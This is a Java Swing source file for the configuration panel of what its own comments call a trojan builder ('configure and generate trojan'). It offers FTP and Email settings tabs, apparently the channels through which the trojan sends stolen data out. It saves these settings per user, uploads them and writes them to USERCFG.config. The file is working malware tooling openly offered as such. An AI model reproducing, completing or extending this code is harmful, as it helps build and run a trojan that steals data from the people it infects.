package com.config;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JTabbedPane;
import javax.swing.border.TitledBorder;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedWriter;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStreamWriter;
import java.util.Iterator;
import java.util.Map;

import com.QQPanel.ICQPOP;
import com.topking.ftp.bean.ConfigBean;
import com.topking.ftp.bean.UserInfoBean;

@SuppressWarnings("serial")
public class ConfigPanel extends JFrame {
	JFrame configpanel;
	ICQPOP icqPOP;
	UserInfoBean userInfoBean;
	ConfigBean configBean;

	public ConfigPanel(ICQPOP icqpop, UserInfoBean uibean, ConfigBean cfbean) { // 配置木马
		System.out.println("配置并生成木马");
		this.icqPOP = icqpop;
		this.userInfoBean = uibean;
		this.configBean = cfbean;
		configpanel = new JFrame("参数配置面板");
		configpanel.setSize(330, 390);
		configpanel.setLayout(null);

		JTabbedPane tp = new JTabbedPane();
		final FtpPanel p1 = new FtpPanel(userInfoBean, configBean);
		final MailPanel p2 = new MailPanel(configBean);
		
		tp.add("p1", p1.getPanel());
		tp.setEnabledAt(0, true);
		tp.setTitleAt(0, "FTP设置");

		tp.add("p2", p2.getPanel());
		tp.setEnabledAt(1, true);
		tp.setTitleAt(1, "Email设置");

		tp.setBounds(10, 5, 300, 270);
		tp.setTabPlacement(JTabbedPane.TOP);
		tp.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT);

		JPanel jpOperation = new JPanel();
		jpOperation.setBorder(new TitledBorder(""));
		jpOperation.setLayout(null);
		jpOperation.setSize(300, 60);
		jpOperation.setBounds(10, 300, 290, 50);
		JButton jbOKApplication = new JButton("应用");
		JButton jbOK = new JButton("确定");
		JButton jbCancel = new JButton("取 消");
		jbOKApplication.setBounds(200, 10, 70, 30);// 横坐标，纵坐标，长，宽
		jbOK.setBounds(20, 10, 70, 30);// 横坐标，纵坐标，长，宽
		jbCancel.setBounds(110, 10, 70, 30);

		// 确定按钮，将面板上的配置信息保存至configbean结构体中
		jbOK.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				System.out.println("配置木马，确定！");
				p1.setConfig();
				p2.setConfig();
				String cfbStr = configBean.toString();
				icqPOP.cfgmap.put(userInfoBean.getUserID(), cfbStr);
				new UploadConfig(userInfoBean, configBean);
				configpanel.dispose();
				StoreConfigInfo();
			}
		});

		jbCancel.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				configpanel.dispose();
			}
		});

		jbOKApplication.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				System.out.println("正在应用配置,请稍候……");
				p1.setConfig();
				p2.setConfig();
				icqPOP.cfgmap.put(userInfoBean.getUserID(),
						configBean.toString());
				JOptionPane.showMessageDialog(null, "设置应用成功，请点击确认上传", "确认",
						JOptionPane.INFORMATION_MESSAGE);
				// new UploadConfig(userInfoBean, configBean);
			}
		});
		jpOperation.add(jbOKApplication);
		jpOperation.add(jbOK);
		jpOperation.add(jbCancel);

		configpanel.add(tp);
		configpanel.add(jpOperation);
		configpanel.setLocationRelativeTo(null);
		configpanel.setVisible(true);
	}

	private void StoreConfigInfo() {
		String cfginfo;
		String cfgInfoStr = "";
		Iterator<Map.Entry<String, String>> cfgit = icqPOP.cfgmap.entrySet()
				.iterator();
		while (cfgit.hasNext()) {
			Map.Entry<String, String> entry = cfgit.next();
			cfginfo = entry.getKey() + "::" + entry.getValue() + "\r\n";
			cfgInfoStr = cfgInfoStr + cfginfo;
		}
		BufferedWriter bufW;
		// 写用户配置到USERCFG.config文件中
		try {
			bufW = new BufferedWriter(new OutputStreamWriter(
					new FileOutputStream("USERCFG.config")));
			try {
				bufW.write(cfgInfoStr);
				bufW.flush();
				bufW.close();
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		} catch (FileNotFoundException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

}